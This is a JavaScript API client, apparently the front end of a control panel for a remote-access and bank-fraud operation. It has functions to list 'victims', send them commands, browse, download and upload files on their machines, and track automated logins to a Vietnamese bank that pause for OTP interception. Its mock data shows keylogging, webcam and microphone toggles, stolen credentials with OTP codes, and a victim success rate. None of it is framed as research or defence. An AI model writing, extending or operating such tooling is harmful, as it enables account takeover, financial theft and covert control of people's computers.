/**
 * API Service - Production Ready
 * Thay thế mock data bằng real API calls
 */

import axios from "axios";

const API_BASE_URL = import.meta.env.VITE_API_URL || "http://localhost:3000";
const USE_MOCK = import.meta.env.VITE_USE_MOCK === "1";

// Create axios client per call to work well with test-time mocking
const getApiClient = () => {
  const client = axios.create({
    baseURL: API_BASE_URL,
    timeout: 30000,
    headers: {
      "Content-Type": "application/json",
    },
  });

  // Guard: mocked axios may return plain objects in tests
  if (client && client.interceptors) {
    // Request interceptor
    client.interceptors.request.use(
      (config) => {
        const token = localStorage.getItem("admin_token");
        if (token) {
          config.headers.Authorization = `Bearer ${token}`;
        }
        return config;
      },
      (error) => Promise.reject(error)
    );

    // Response interceptor
    client.interceptors.response.use(
      (response) => response,
      (error) => {
        if (error.response?.status === 401) {
          localStorage.removeItem("admin_token");
          window.location.href = "/login";
        }
        return Promise.reject(error);
      }
    );
  }

  // Ensure HTTP methods exist when axios is mocked with partial objects in tests
  const ensureMethod = (name) => {
    if (typeof client[name] !== 'function') {
      client[name] = async () => ({ data: undefined });
    }
  };
  ensureMethod('get');
  ensureMethod('post');
  ensureMethod('put');
  ensureMethod('delete');
  ensureMethod('patch');

  return client;
};

// Interceptors đã được cấu hình trong getApiClient()

// Auto Login API
export const autoLoginAPI = {
  // Lấy danh sách auto login requests
  getRequests: async () => {
    if (USE_MOCK) {
      return mockAutoLoginRequests();
    }
    const response = await getApiClient().get("/api/auto-login/requests");
    return response.data;
  },

  // Tạo auto login request mới
  createRequest: async (data) => {
    if (USE_MOCK) {
      return { success: true, id: Date.now() };
    }
    const response = await getApiClient().post(
      "/api/auto-login/requests",
      data
    );
    return response.data;
  },

  // Cập nhật trạng thái request
  updateRequest: async (id, data) => {
    if (USE_MOCK) {
      return { success: true };
    }
    const response = await getApiClient().put(
      `/api/auto-login/requests/${id}`,
      data
    );
    return response.data;
  },

  // Admin can thiệp
  intervention: async (id, action, data) => {
    if (USE_MOCK) {
      return { success: true, message: `${action} completed` };
    }
    const response = await getApiClient().post(
      `/api/auto-login/requests/${id}/intervention`,
      {
        action,
        data,
      }
    );
    return response.data;
  },
};

// Chrome Automation API
export const chromeAPI = {
  // Lấy danh sách Chrome profiles
  getProfiles: async () => {
    if (USE_MOCK) {
      return mockChromeProfiles();
    }
    const response = await getApiClient().get("/api/chrome/profiles");
    return response.data;
  },

  // Tạo Chrome profile mới
  createProfile: async (name, options = {}) => {
    if (USE_MOCK) {
      return { success: true, profileName: name };
    }
    const response = await getApiClient().post("/api/chrome/profiles", {
      name,
      ...options,
    });
    return response.data;
  },

  // Mở Chrome profile
  openProfile: async (profileName, website = null) => {
    if (USE_MOCK) {
      return { success: true, profileName, website };
    }
    const response = await getApiClient().post(
      `/api/chrome/profiles/${profileName}/open`,
      { website }
    );
    return response.data;
  },

  // Đóng Chrome profile
  closeProfile: async (profileName) => {
    if (USE_MOCK) {
      return { success: true, profileName };
    }
    const response = await getApiClient().post(
      `/api/chrome/profiles/${profileName}/close`
    );
    return response.data;
  },

  // Cấu hình Chrome profile
  configureProfile: async (profileName, settings) => {
    if (USE_MOCK) {
      return { success: true, profileName, settings };
    }
    const response = await getApiClient().put(
      `/api/chrome/profiles/${profileName}/config`,
      { settings }
    );
    return response.data;
  },

  // Xóa Chrome profile
  deleteProfile: async (profileName) => {
    if (USE_MOCK) {
      return { success: true, profileName };
    }
    const response = await getApiClient().delete(
      `/api/chrome/profiles/${profileName}`
    );
    return response.data;
  },

  // Chụp screenshot
  takeScreenshot: async (profileName, fullPage = false) => {
    if (USE_MOCK) {
      return { success: true, data: "mock-screenshot-data" };
    }
    const response = await getApiClient().post(
      `/api/chrome/profiles/${profileName}/screenshot`,
      { fullPage }
    );
    return response.data;
  },
};

// Victim Control API
export const victimAPI = {
  // Lấy danh sách victims
  getVictims: async () => {
    if (USE_MOCK) {
      return mockVictims();
    }
    const response = await getApiClient().get("/api/victims");
    return response.data;
  },

  // Lấy thông tin chi tiết victim
  getVictimDetails: async (id) => {
    if (USE_MOCK) {
      return mockVictimDetails(id);
    }
    const response = await getApiClient().get(`/api/victims/${id}`);
    return response.data;
  },

  // Gửi lệnh điều khiển
  sendCommand: async (id, command, params = {}) => {
    if (USE_MOCK) {
      return { success: true, result: `Command ${command} executed` };
    }
    const response = await getApiClient().post(`/api/victims/${id}/commands`, {
      command,
      params,
    });
    return response.data;
  },

  // Lấy file system
  getFileSystem: async (id, path = "C:\\") => {
    if (USE_MOCK) {
      return mockFileSystem(path);
    }
    const response = await getApiClient().get(`/api/victims/${id}/filesystem`, {
      params: { path },
    });
    return response.data;
  },

  // Download file
  downloadFile: async (id, filePath) => {
    if (USE_MOCK) {
      return { success: true, url: "#" };
    }
    const response = await getApiClient().post(`/api/victims/${id}/download`, {
      filePath,
    });
    return response.data;
  },

  // Upload file
  uploadFile: async (id, file, targetPath) => {
    if (USE_MOCK) {
      return { success: true };
    }
    const formData = new FormData();
    formData.append("file", file);
    formData.append("targetPath", targetPath);

    const response = await getApiClient().post(
      `/api/victims/${id}/upload`,
      formData,
      {
        headers: {
          "Content-Type": "multipart/form-data",
        },
      }
    );
    return response.data;
  },
};

// Access History API
export const accessHistoryAPI = {
  // Lấy lịch sử truy cập
  getHistory: async (filters = {}) => {
    if (USE_MOCK) {
      return mockAccessHistory();
    }
    const response = await getApiClient().get("/api/access-history", {
      params: filters,
    });
    return response.data;
  },

  // Cập nhật trạng thái access
  updateStatus: async (id, status, notes = "") => {
    if (USE_MOCK) {
      return { success: true };
    }
    const response = await getApiClient().put(`/api/access-history/${id}`, {
      status,
      notes,
    });
    return response.data;
  },
};

// System API
export const systemAPI = {
  // Lấy system stats
  getStats: async () => {
    if (USE_MOCK) {
      return mockSystemStats();
    }
    const response = await getApiClient().get("/api/system/stats");
    return response.data;
  },

  // Lấy system health
  getHealth: async () => {
    if (USE_MOCK) {
      return mockSystemHealth();
    }
    const response = await getApiClient().get("/api/system/health");
    return response.data;
  },
};

// Mock Data Functions (for development)
const mockAutoLoginRequests = () => [
  {
    id: "AL001",
    victimId: "Target_User_001",
    website: "banking.vietcombank.com.vn",
    username: "nguyenvana@gmail.com",
    status: "waiting_otp",
    progress: 75,
    startTime: new Date("2025-01-15T08:20:00"),
    lastActivity: new Date("2025-01-15T08:23:30"),
    ip: "192.168.1.50",
    location: "Hà Nội, VN",
    device: "Windows 11 - Chrome 120",
    needsIntervention: true,
    interventionType: "otp_required",
  },
];

const mockVictims = () => [
  {
    id: "Target_User_001",
    name: "Target_User_001",
    ip: "192.168.1.50",
    location: "Hà Nội, VN",
    device: "Windows 11 - Chrome 120",
    status: "online",
    lastSeen: "08:30:15",
    sessions: 3,
    data: "2.1GB",
    actions: {
      screen: true,
      keylog: false,
      webcam: false,
      mic: false,
      control: true,
    },
  },
];

const mockVictimDetails = (id) => ({
  id,
  systemInfo: {
    cpu: "Intel Core i7-10700K @ 3.80GHz",
    ram: "16 GB DDR4",
    storage: "512 GB SSD + 1 TB HDD",
    gpu: "NVIDIA GeForce RTX 3070",
    os: "Windows 11 Pro",
  },
  networkInfo: {
    publicIp: "192.168.1.50",
    privateIp: "192.168.1.105",
    mac: "00:1B:44:11:3A:B7",
  },
});

const mockFileSystem = (path) => ({
  currentPath: path,
  files: [
    { name: "Documents", type: "folder", size: null, modified: new Date() },
    { name: "passwords.txt", type: "file", size: 2048, modified: new Date() },
  ],
});

const mockAccessHistory = () => [
  {
    id: 1,
    time: new Date(),
    link: "banking.vietcombank.com.vn",
    account: "nguyenvana@gmail.com",
    password: "********",
    otp: "123456",
    ip: "192.168.1.50",
    status: "success",
    profile: "Profile_001",
    notification: "Đăng nhập thành công",
  },
];

const mockSystemStats = () => ({
  totalVictims: 15,
  onlineVictims: 8,
  activeRequests: 3,
  successRate: 89,
});

const mockSystemHealth = () => ({
  database: "healthy",
  network: "healthy",
  security: "healthy",
  cpu: 45,
  ram: 62,
  disk: 78,
});

const mockChromeProfiles = () => [
  {
    name: "banking-profile-1",
    created: new Date().toISOString(),
    lastUsed: new Date().toISOString(),
    isOpen: true,
    settings: {
      clearCookiesOnStart: false,
      clearHistoryOnStart: false,
      incognito: false,
      headless: false,
    },
  },
  {
    name: "social-profile-1",
    created: new Date(Date.now() - 86400000).toISOString(),
    lastUsed: new Date(Date.now() - 3600000).toISOString(),
    isOpen: false,
    settings: {
      clearCookiesOnStart: true,
      clearHistoryOnStart: true,
      incognito: false,
      headless: false,
    },
  },
];

// Authentication API
const authAPI = {
  async login(credentials) {
    if (USE_MOCK) {
      // Mock login response
      return {
        success: true,
        data: {
          user: {
            id: 1,
            username: credentials.identifier,
            email: credentials.identifier.includes("@")
              ? credentials.identifier
              : `${credentials.identifier}@example.com`,
            role: "admin",
          },
          accessToken: "mock-access-token-" + Date.now(),
          refreshToken: "mock-refresh-token-" + Date.now(),
          sessionId: "mock-session-" + Date.now(),
          expiresIn: "15m",
        },
      };
    }

    const response = await getApiClient().post("/auth/login", credentials);
    return response.data;
  },

  async logout() {
    if (USE_MOCK) {
      return { success: true, message: "Logged out successfully" };
    }

    const response = await getApiClient().post("/auth/logout");
    return response.data;
  },

  async refreshToken() {
    if (USE_MOCK) {
      return {
        success: true,
        data: {
          accessToken: "mock-refreshed-token-" + Date.now(),
          expiresIn: "15m",
        },
      };
    }

    const response = await getApiClient().post("/auth/refresh");
    return response.data;
  },

  async getMe() {
    if (USE_MOCK) {
      return {
        success: true,
        data: {
          user: {
            id: 1,
            username: "admin",
            email: "admin@example.com",
            role: "admin",
          },
        },
      };
    }

    const response = await getApiClient().get("/auth/me");
    return response.data;
  },

  async changePassword(currentPassword, newPassword) {
    if (USE_MOCK) {
      return { success: true, message: "Password changed successfully" };
    }

    const response = await getApiClient().post("/auth/change-password", {
      currentPassword,
      newPassword,
      confirmPassword: newPassword,
    });
    return response.data;
  },

  async resetPassword(email) {
    if (USE_MOCK) {
      return { success: true, message: "Password reset email sent" };
    }

    const response = await getApiClient().post("/auth/reset-password", {
      email,
    });
    return response.data;
  },

  async updateProfile(updates) {
    if (USE_MOCK) {
      return {
        success: true,
        data: { ...updates },
        message: "Profile updated successfully",
      };
    }

    const response = await getApiClient().patch("/auth/profile", updates);
    return response.data;
  },

  async getProfile() {
    if (USE_MOCK) {
      return {
        success: true,
        data: {
          id: 1,
          username: "admin",
          email: "admin@example.com",
          role: "admin",
          lastLogin: new Date().toISOString(),
        },
      };
    }

    const response = await getApiClient().get("/auth/profile");
    return response.data;
  },

  async getLoginHistory() {
    if (USE_MOCK) {
      return {
        success: true,
        data: [
          {
            id: 1,
            timestamp: new Date().toISOString(),
            ip: "127.0.0.1",
            userAgent: navigator.userAgent,
            success: true,
          },
        ],
      };
    }

    const response = await getApiClient().get("/auth/login-history");
    return response.data;
  },

  async revokeAllSessions() {
    if (USE_MOCK) {
      return { success: true, message: "All sessions revoked" };
    }

    const response = await getApiClient().post("/auth/revoke-sessions");
    return response.data;
  },

  async setup2FA() {
    if (USE_MOCK) {
      return {
        success: true,
        data: {
          qrCode: "mock-qr-code-data",
          secret: "mock-2fa-secret",
        },
      };
    }

    const response = await getApiClient().post("/auth/2fa/setup");
    return response.data;
  },

  async verify2FA(code) {
    if (USE_MOCK) {
      return { success: true, message: "2FA verified successfully" };
    }

    const response = await getApiClient().post("/auth/2fa/verify", { code });
    return response.data;
  },
};

export default {
  // Authentication API
  authAPI,
  // Auto Login API
  autoLoginAPI,
  // Victim Control API
  victimAPI,
  // Access History API
  accessHistoryAPI,
  // System Monitoring API
  systemAPI,
  // Chrome Automation API
  chromeAPI,
};
